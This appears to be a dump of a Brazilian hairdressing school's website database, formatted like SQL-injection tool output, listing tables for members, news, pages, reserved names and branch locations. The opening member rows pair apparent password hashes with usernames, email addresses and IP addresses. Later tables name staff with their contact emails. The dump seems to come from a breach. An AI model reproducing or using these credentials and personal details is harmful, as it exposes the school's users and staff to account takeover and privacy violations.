+| 10        | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | 3f8c720679b8aea7ec6d072d6e8d904f | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 200.171.151.147 | NULL      | 5         | NULL       | 1172512613 | NULL       | 0          | <blank>    | liberdade   | NULL       | NULL       | 0          | <blank>       | <blank>      | liberdade@escolanonaka.com.br   | <blank>        | 1170867788     |
+| 11        | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | 52ffe7b29cd8e0467c43ca18f9e5c49c | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 186.204.194.244 | NULL      | 6         | NULL       | 1541449524 | NULL       | 0          | <blank>    | nonaka      | NULL       | NULL       | 0          | <blank>       | <blank>      | contato@escolanonaka.com.br     | <blank>        | 1170869824     |
++-----------+------+------+-----------+------+------+---------+------+---------+--------+----------------------------------+---------+---------+---------+----------+---------+---------+------------+----------+----------+-----------------+-----------+-----------+------------+------------+------------+------------+------------+-------------+------------+------------+------------+---------------+--------------+---------------------------------+----------------+----------------+
+
+Database: escola_nonaka
+Table: nonaka_membersgroups
+[0 entries]
++----------+------+-------------+
+| ID_GROUP | name | mg_desconto |
++----------+------+-------------+
++----------+------+-------------+
+
+Database: escola_nonaka
+Table: nonaka_noticias
+[2 entries]
++-------------+------------------------------------+-----------------------------------------------+------------+-----------+------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| ID_NOTICIAS | not_img                            | not_thb                                       | not_data   | not_fonte | not_titulo                         | not_conteudo                                                                                                                                                                                                     |
++-------------+------------------------------------+-----------------------------------------------+------------+-----------+------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 98          | ./images/noticias/Nonaka_1.jpg     | ./images/noticias/thumbs/thb_Nonaka_1.jpg     | 2011-06-14 | <blank>   | Sr. Paulo Nonaka                   | Caros amigos.\r\n\r\nNós da escola de cabeleireiros Nonaka nos dedicamos dia após dia para que nossos alunos ao concluir nossos cursos estejam preparados e devidamente certificados para o mercado de trabalho. |
+| 99          | ./images/noticias/Guy-Haircuts.jpg | ./images/noticias/thumbs/thb_Guy-Haircuts.jpg | 2013-01-12 | <blank>   | CURSOS DE CABELEIREIROS E MANICURE | COMECE 2019 COM O PÉ DIREITO! A FILIAL NONAKA DE SANTANA ESTÁ COM UMA PROMOÇÃO IMPERDÍVEL DE 20% DE DESCONTO NOS CURSOS DE CABELEIREIROS E MANICURE. LIGUE AGORA ! TEL.: 2976-8828.                              |
++-------------+------------------------------------+-----------------------------------------------+------------+-----------+------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: escola_nonaka
+Table: nonaka_pages
+[23 entries]
++---------+------+---------------+-------+-------+----------------+---------+-----------+------------------+--------------+--------------+
+| ID_PAGE | menu | page          | nivel | admin | funcao         | submenu | incluir   | template         | gruop_access | page_dinamic |
++---------+------+---------------+-------+-------+----------------+---------+-----------+------------------+--------------+--------------+
+| 1       | 0    | index         | 0     | 0     | IndexPage      | NULL    | Index     | main.xml         | NULL         | 0            |
+| 2       | 0    | admin         | 1     | 0     | Administrador  | 1       | Admin     | admin.xml        | <blank>      | 0            |
+| 3       | 0    | login         | 0     | 0     | Page_login     | 1       | Login     | login.xml        | NULL         | 0            |
+| 4       | 0    | logout        | 0     | 0     | Page_logout    | NULL    | Login     | <blank>          | NULL         | 0            |
+| 5       | 1    | cadastro      | 0     | 0     | Registro       | 1       | Registro  | registro.xml     | NULL         | 0            |
+| 6       | 0    | userlist      | 6     | 1     | ListaUsuarios  | 2       | Usuarios  | user_list.xml    | NULL         | 0            |
+| 8       | 0    | noticialist   | 6     | 1     | NoticiaList    | 2       | Noticias  | noticias.xml     | NULL         | 0            |
+| 9       | 0    | noticias_int  | 0     | 0     | NoticiaInterna | NULL    | Noticias  | noticias_int.xml | NULL         | 1            |
+| 105     | 0    | unidadeslist  | 5     | 1     | UnidadesList   | 2       | Unidades  | unidades.xml     | NULL         | 0            |
+| 15      | 1    | fcontato      | 0     | 0     | IndexStatic    | 1       | Index     | main_default.xml | NULL         | 1            |
+| 28      | 0    | mailsend      | 0     | 0     | Contatos       | NULL    | Contatos  | <blank>          | NULL         | 1            |
+| 21      | 1    | empresa       | 0     | 0     | IndexStatic    | 1       | Index     | main_default.xml | NULL         | 4            |
+| 100     | 1    | cadastro      | 6     | 1     | Registro       | 2       | Registro  | registro.xml     | NULL         | 0            |
+| 101     | 0    | noticianew    | 6     | 1     | NoticiasNew    | 2       | Noticias  | noticianew.xml   | NULL         | 0            |
+| 102     | 1    | contato       | 0     | 0     | formcontato    | 2       | Fcontato  | contato.xml      | NULL         | 0            |
+| 103     | 0    | textolist     | 6     | 1     | TextosList     | 2       | Textos    | texto_list.xml   | NULL         | 0            |
+| 104     | 0    | estaticaslist | 6     | 1     | EstaticasList  | 2       | Estaticas | estaticas.xml    | NULL         | 0            |
+| 106     | 0    | unidades      | 0     | 0     | UnidadeInterna | NULL    | Unidades  | unidades_int.xml | NULL         | 1            |
+| 107     | 0    | unidadenew    | 6     | 1     | UnidadeNew     | 2       | Unidades  | unidadenew.xml   | NULL         | 0            |
+| 108     | 1    | cursos        | 0     | 0     | IndexStatic    | 1       | Index     | main_default.xml | NULL         | 10           |
+| 109     | 0    | dicalist      | 6     | 1     | DicasList      | 2       | Dicas     | dicas.xml        | NULL         | 0            |
+| 110     | 0    | dicas_int     | 0     | 0     | DicaInterna    | NULL    | Dicas     | dicas_int.xml    | NULL         | 1            |
+| 111     | 0    | dicanew       | 6     | 1     | DicasNew       | 2       | Dicas     | dicanew.xml      | NULL         | 0            |
++---------+------+---------------+-------+-------+----------------+---------+-----------+------------------+--------------+--------------+
+
+Database: escola_nonaka
+Table: nonaka_pages_dinamic
+[2 entries]
++----------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+----------------------+
+| ID_PAGED | page_name | page_extra1 | page_conteudo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | page_name_jap_jp | page_conteudo_jap_jp |
++----------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+----------------------+
+| 10       | cursos    | <blank>     | <div id="meio" class="font_01"><h1>Conheça nossos cursos</h1><h2>BÁSICO</h2><text>Curso de cabeleireiro básico, que engloba cortes, escovas e químicas em geral. O curso tem duração de 7 meses, com carga horária de 3 horas por dia, de segunda à sexta, nos horários da manhã, tarde ou noite. Para a sua comodidade a  escola oferece planos e horários diversificados conforme as suas necessidades.  Consulte a disponibilidade de horários da unidade em que deseja fazer o curso (temos outros planos também). Ex: 3 vezes por semana, etc.</text><br/ ><text>Diploma ou certificado reconhecido Pelo Departamento de Ensino Profissional no Estado de São Paulo e pelo  Sindicato das Escolas de Cabeleireiros do Estado de São Paulo (SINDESCAB)</text><br/ ><br/ ><h2>APERFEIÇOAMENTO</h2><text>Você que fez o curso de cabeleireiro ou manicure e pedicure e ficou parado (a) muitos anos, ou você que quer sempre estar atualizado diante do mercado, não deixe de visitar a nossa escola. Aqui você terá um aperfeiçoamento de qualidade e estará um passo a frente dos seus concorrentes.</text><br/ ><br/ ><h2>MANICURE E PEDICURE</h2><text>Aqui você encontra o curso básico de manicure e pedicure, onde você aprende na prática.</text><br/ ><text>O curso tem duração de 3 meses e são 3 horas por dia de segunda a sexta-feira, com diploma incluso.</text><br/ ><br/ ><h2>LIMPEZA DE PELE, MAQUIAGEM E DEPILAÇÃO</h2><text>Os cursos de Limpeza de pele, maquiagem ou depilação, são cursos rápidos com duração de 5 aulas com 3 horas por dia, e são excelentes opções complementares para quem já é cabeleireiro (a) ou manicure e pedicure. Pois aumenta o seu campo de atuação.</text><br/ ><br/ ><h2>PENTEADOS PRESOS</h2><text>O curso de penteados presos tem duração de 2 meses, 3 horas por dia, 2 vezes por semana.</text><br/ ><text>Consulte as unidades que lecionam esse curso.</text><br/ ><br /><br /><h2>MATERIAIS DO CURSO DE CABELEIREIRO</h2><b>1ª Fase</b><br/ ><br/ ><text>Enrolamento de:</text><br/ >caracol;<br/ >bobs;<br/ >bigodins;<br/ >simulação de corte.<br/ ><ul><li>1 cx de grampo pequeno</li><li>1 cx de grampo grande</li><li>1 pente de cabo PROART</li><li>4 dz de bobs (3dz. nº 2 e 1 dz nº 3)</li><li>1 atomizador de água PROART</li><li>1 rede c/ protetor de orelhas</li><li>1 toalha de rosto</li><li>60 bigodins médios</li><li>1 dúzia de clips</li><li>1 cx de papel de permanente</li><li>1 avental plástico PROART</li><li>1 avental branco PROART</li><li>1 pacote de presilhas</li></ul><b>2ª Fase</b><ul><li>Alisamento/Relaxamento</li><li>Banho de Petróleo</li><li>Hidratação</li><li>Mechas e Reflexos</li><li>Permanente</li><li>Tintura</li><li>1 capa plástica PROART</li><li>1 tigela de plástico</li>\r\n<li>1 dz de clips</li><li>1 cx de papel de permanente</li><li>pincel para tintura PROART</li>\r\n<li>par de luvas de borracha</li><li>1 touca plástica</li><li>1 agulha de crochê nº 6 de corrente</li>\r\n<li>1 algodão</li><li>1 touca de reflexo</li><li>3 toalhas</li></ul><b>3ª Fase</b><ul><li>Corte e Escova</li><li>Masculino</li><li>Feminino</li><li>3 escovas PROART</li><li>1 talco</li><li>1 espanador de cabelo</li><li>1 secador manual TAIFF</li><li>1 tesoura p/ cortar cabelos PROART</li><li>1 navalha TAIFF</li><li>1 cx de curativos</li><li>1 capa de nylon PROART</li><li>3 toalhas</li><li>1 máquina de cortar cabelo TAIFF</li><li>1 pente p/ corte PROART</li><li>1 máquina de acabamento PROART</li>\r\n</ul><h2>MATERIAIS DO CURSO DE MANICURE E PEDICURE</h2><ul><li>2 alicates de unha</li><li>2 alicates de cutícula</li><li>2 espátulas inox</li><li>2 toalhas de rosto</li><li>4 toalhas de mão</li><li>6 palitos</li><li>6 lixas</li><li>1 lixão de pé</li><li>esmaltes (cores variadas, inclusive cintilante)</li><li>algodão</li><li>creme para mãos e pés</li><li>base</li><li>óleo secante</li><li>1 pó hemostático</li><li>1 pomada nebacetim</li><li>1 água oxigenada de 10 volumes antiséptico</li>\r\n<li>protetor para bacia de mão e pé</li><li>acetona</li></ul><br /><br /></h2></div>                                                                                                                                   | NULL             | NULL                 |
+| 4        | empresa   | <blank>     | <div id="meio" class="font_01"><h1>43 anos formando profissionais da Beleza</h1><div class="foto_right"><img src="images/nonaka.jpg" /></div><text>A Escola Nonaka completa 43 anos de existência e de prestação de serviços à comunidade. Desde a sua fundação em 1963, por ela já passaram mais de 40 mil alunos.\r\nHoje, ela é referência no meio profissional de beleza, e dificilmente encontramos alguém, no meio profissional, que não tenha ao menos ouvido o seu Nome.</text><br /><br /><text>Em sua história bem peculiar, alguns pontos indicam o seu caminho de empreendedorismo e sucesso:\r\nPioneirismo: foi a primeira escola a oferecer um dos mais completos cursos de formação em Beleza. Desde sua concepção, os seus cursos já incluiam formação em química capilar, depilação, limpeza de pele, maquilagem, penteados, dentre outros cursos para o aperfeiçoamento.</text><br /><br /><text>Compromisso Social: apesar das altos e baixos do mercado brasileiro, a empresa sempre foi de vanguarda, tal que inúmeros profissionais se formaram através de bolsas de estudo custeadas por ela mesma. Seu objetivo principal sempre fora o de formar profissionais competentes ao mercado. Essa sempre foi a sua colaboração para com a classe, para com a comunidade.</text><br /><br /><text>\r\nFamilia: é a força familiar que mantem a empresa estável. Haja visto que todas as filiais espalhadas na capital paulistana são administradas por filhos, genros, noras e netos, todos fiéis para a linha de ensino do seu fundador: Yosinobo Nonaka, mais conhecido no meio profissional como Paulo Nonaka.\r\nO Mestre: Paulo Nonaka, trabalhou na Secretaria da Educação, nos idos de 1961. No entanto, tentando por fim em suas dificuldades financeiras da época saiu em busca de novas alternativas. Assim, com muita dedicação se formou na Escola de Cabeleireiros Akahoshi. Abriu um Salão de Beleza e mesmo não tendo resultados imediatos nessa empreitada, permaneceu perseverante em seu propósito. Recorreu a várias fontes, mas de fato só pode contar com ajuda de um familiar que acreditou em seu projeto e financiou a sua primeira escola.</text><br /><br /><text>Desta forma, trabalhando incansavelmente, formou a sua primeira turma de 16 alunos em 1963, uma época em que os grandes salões do mercado não viam com bons olhos esses novos empreendimentos. Acredita-se até que uma das causas era o medo da concorrência.</text><br /><br /><text>Ao longo de sua história, sempre foi um cidadão atuante, participando ativamente de inúmeros conselhos técnicos e outras instituições.</text><br /><br /><text>Como pedagogo, sempre se preocupou com a qualificação profissional. Por isso, juntamente com outros proprietários de escolas de beleza, procurou o Departamento de Ensino de São Paulo, com a proposta de estruturar provas práticas e teóricas para que os alunos pudessem obter uma certificação reconhecida.\r\nFoi então que em 1967, as escolas de Cabeleireiros existentes foram submetidas aos testes: apenas seis escolas foram aprovadas e adquiriram o reconhecimento da Delegacia e consequentemente o respeito da classe e da sociedade.</text><br /><br /><text>Desta feita, o mestre Nonaka fora convidado, pelo Senac, a ministrar cursos de formação de Cabeleireiros: realizou este trabalho durante o período de 1968 à 1985.</text><br /><br /><text>E por fim, após muita dedicação à classe, hoje o mestre está a frente da Presidência do Sindicato das Centros de Formação e Escolas de Cabeleireiros e Similares de São Paulo e junto aos seus colegas de categoria tem promovido diariamente a defesa pela normatização dos trabalhos, tal que sua gestão conseguiu instituir, em conjunto com o Sindicato Paulista dos Profissionais em Terapias Pró-Beleza e Similares, a primeira Convenção Coletiva de Trabalho que trata de assuntos especificos dos profissionais das escolas de beleza e similares, e que até hoje nunca tinham sido discutidos por entidade alguma.</text><br /><br /><text>Em resumo, após obstáculos e conquistas, a Escola Nonaka comemora este ano o seu 43ª aniversário e faz jus a marca de mais de 20 mil alunos "formados".<text></div> | NULL             | NULL                 |
++----------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+----------------------+
+
+Database: escola_nonaka
+Table: nonaka_reserved_names
+[25 entries]
++-----------+-----------+
+| setting   | value     |
++-----------+-----------+
+| matchname | 1         |
+| matchuser | 1         |
+| matchcase | 1         |
+| matchword | 1         |
+| matchword | 1         |
+| matchcase | 1         |
+| matchuser | 1         |
+| matchname | 1         |
+| word      | Admin     |
+| word      | christ    |
+| word      | demo      |
+| word      | fake      |
+| word      | god       |
+| word      | guest     |
+| word      | Guest     |
+| word      | jesus     |
+| word      | karati    |
+| word      | me        |
+| word      | test      |
+| word      | ViRuS     |
+| word      | visitor   |
+| word      | webgod    |
+| word      | Webmaster |
+| word      | Wysiwyg   |
+| word      | yabbse    |
++-----------+-----------+
+
+Database: escola_nonaka
+Table: nonaka_textos
+[1 entry]
++----------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| ID_TEXTO | texto_nome | texto_conteudo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
++----------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1        | home       | A Escola de Cabeleireiros Nonaka tradicional nome entre os \r\n profissionais da beleza, tem em sua base uma forte estrutura familiar, que \r\n vem ao longo de mais de 40 anos, formando e aperfeiçoando profissionais de \r\n cabelo, manicures, esteticistas etc... Voltada a dar de maneira simples e \r\ndireta, um ensino preparatorio, que visa mostrar ao futuro profissional \r\ntoda a rotina de um verdadeiro salão de beleza. Com técnicas tradicionais \r\ne universalmente conhecidas o aluno aprende na prática... sem nunca deixar \r\nde inserir técnicas de vanguarda e novidades para que o aluno tenha uma \r\nvisão geral da profissão.Hoje, a maioria dos profissionais de beleza, seja \r\nele um iniciante ou um profissional de renome, conhece a Nonaka. Um nome \r\nde confiança e tradição... Seu fundador Paulo Nonaka tem o respeito e a \r\nadmiração de toda a classe. Venha e faça parte desta familia... Um forte \r\nabraço... Escola Nonaka |
++----------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: escola_nonaka
+Table: nonaka_unidades
+[6 entries]
++-----------+------------+--------------------+--------------------------------------------------------------------------------+----------------------------------------+----------------------------------------------+--------------+----------------------------------------+-----------------------------------------+----------------------------------------+----------------------+-------------------------------+--------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------+
+| ID_MEMBER | ID_UNIDADE | unidade_tel        | unidade_end                                                                    | unidade_img2                           | unidade_img3                                 | unidade_nome | unidade_img1                           | unidade_img4                            | unidade_mapa                           | unidade_resp         | unidade_email                 | unidade_texto                                                            | unidade_cursos                                                                                                                                    | unidade_horario                                                       |
++-----------+------------+--------------------+--------------------------------------------------------------------------------+----------------------------------------+----------------------------------------------+--------------+----------------------------------------+-----------------------------------------+----------------------------------------+----------------------+-------------------------------+--------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------+
+| 5         | 11         | 11 55245122        | Rua Voluntários Deomiro Sampaio, 52 1º A. CEP: 04754-000                       | ./images/unidades/logo nonaka_1.jpg    | ./images/unidades/logo nonaka_2.jpg          | Santo Amaro  | ./images/unidades/logo nonaka.jpg      | ./images/unidades/logo nonaka_3.jpg     | ./images/unidades/mapa-nonaka_1.jpg    | Sérgio               | sergio@escolanonaka.com.br    | <blank>                                                                  | Curta Duração, Básico, Aperfeiçoamento, Manicure e Pedicure, Limpeza De Pele, Maquiagem, Curso de Unhas Artísticas, Depilação e Penteados Presos. | Segunda a Sexta das 9:00 as 21:00hs / Sábados das 9:00 as 17:00 Horas |
+| 0         | 4          | Tel: (11)3209-0230 | Praça da Liberdade, 262 - 3ºA  CEP: 01503-010 – LIBERDADE - SÃO PAULO-SP       | ./images/unidades/liberdade-(1).jpg    | ./images/unidades/liberdade-(2).jpg          | Liberdade    | ./images/unidades/liberdade.jpg        | ./images/unidades/liberdade-(3).jpg     | ./images/unidades/mapa_liberdade_1.jpg | Sra. Sônia           | sonia@escolanonaka.com.br     | Atendimento para modelos a preços populares.                             | Curta duração para cabeleireiro básico e aperfeiçoamento, Confira !                                                                               | Segunda a Sexta das 9:00 as 21:00hs / Sábados das 8:00 as 15:00 Horas |
+| 0         | 5          | (11)2674-2227      | Av. Dr. Eduardo Cotching, 2184 - CEP: 03356-001 -  VILA FORMOSA - SÃO PAULO-SP | ./images/unidades/vila_formosa-(2).jpg | ./images/unidades/vila_formosa-(3).jpg       | V. Formosa   | ./images/unidades/vila_formosa-(1).jpg | ./images/unidades/vila_formosa.jpg      | ./images/unidades/mapa_formosa.jpg     | Sr. Daniel Sra. Rose | daniel@escolanonaka.com.br    | Atendimento para modelos a preços populares.                             | Curta Duração, Básico, Aperfeiçoamento, Manicure e Pedicure, Limpeza De Pele, Maquiagem, Depilação e Penteados Presos.                            | Segunda a Sexta das 9:00 as 21:00hs / Sábados das 9:00 as 17:00 Horas |
+| 5         | 7          | (11)2976-8828      | Rua Leite de Moraes, 130                                                       | ./images/unidades/santana-(2).jpg      | ./images/unidades/santana.jpg                | Santana      | ./images/unidades/santana-(1).jpg      | ./images/unidades/Nonaka.jpg            | ./images/unidades/mapa_santana.jpg     | Sra. Regiane         | regiane@escolanonaka.com.br   | Cursos de cabeleireiro e manicure com 20% desconto apenas em novembro!!! | Cabeleireiro e Manicure.                                                                                                                          | Segunda à sexta das 9:00 às 20:00, e Sábados das 9:00 às 18:00        |
+| 5         | 8          | (11)2952-7648      | Av. Tucuruvi, 955/957 – TÉRREO - CEP: 02305-002 – TUCURUVI - SÃO PAULO-SP      | ./images/unidades/tucuruvi-(1).jpg     | ./images/unidades/tucuruvi-(2).jpg           | Tucuruvi     | ./images/unidades/unnamed-20.jpg       | ./images/unidades/tucuruvi-(3).jpg      | ./images/unidades/mapa_tucuruvi.jpg    | Sr. Adalberto        | adalberto@escolanonaka.com.br | Atendimento para modelos a preços populares.                             | Curta Duração, Básico, Aperfeiçoamento, Manicure e Pedicure, Limpeza De Pele, Maquiagem, Depilação e Penteados Presos.                            | Segunda a Sexta das 9:00 as 21:00hs / Sábados das 9:00 as 17:00 Horas |
+| 0         | 9          | Tel: (11)2742-9631 | Rua Dr. Campos Moura, 95 - CEP: 03568-000 – ARTUR ALVIM - SÃO PAULO-SP         | ./images/unidades/a_alvin03.jpg        | ./images/unidades/aroldo_gerente_a_alvin.jpg | Arthur Alvim | ./images/unidades/a_alvin02.jpg        | ./images/unidades/prof_paulo_nonaka.jpg | ./images/unidades/mapa_alvim.jpg       | Sr. Aroldo           | aroldo@escolanonaka.com.br    | Atendimento para modelos a preços populares.                             | Curta Duração, Básico, Aperfeiçoamento, Manicure e Pedicure, Limpeza De Pele, Maquiagem, Depilação e Penteados Presos.                            | Segunda a Sexta das 9:00 as 21:00hs / Sábados das 9:00 as 17:00 Horas |
++-----------+------------+--------------------+--------------------------------------------------------------------------------+----------------------------------------+----------------------------------------------+--------------+----------------------------------------+-----------------------------------------+----------------------------------------+----------------------+-------------------------------+--------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------+
+
